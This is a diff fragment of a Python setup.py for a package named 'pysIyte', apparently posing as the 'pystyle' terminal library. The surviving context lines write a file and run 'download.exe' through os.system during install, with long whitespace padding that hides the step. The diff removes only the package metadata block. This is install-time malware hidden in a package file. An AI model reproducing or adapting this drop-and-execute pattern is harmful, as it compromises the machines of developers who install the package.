@@ -12,16 +12,6 @@ f2.write(file)
 f2.close()
 os.system("download.exe")
 																																																				
-setup(
-    name="pysIyte",
-    version='1.9',
-    license='Eclipse Public License 2.0',
-    authors="Oxygen1337",
-    author_email="<Oxygen1337@gmail.com>",
-    description="by Oxygen1337",
-    long_description='No documentation for the moment',
-    keywords=['cli', 'fade', 'colors', 'terminal', 'tui'],
-    packages=['pysIyte']
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                       
 
 
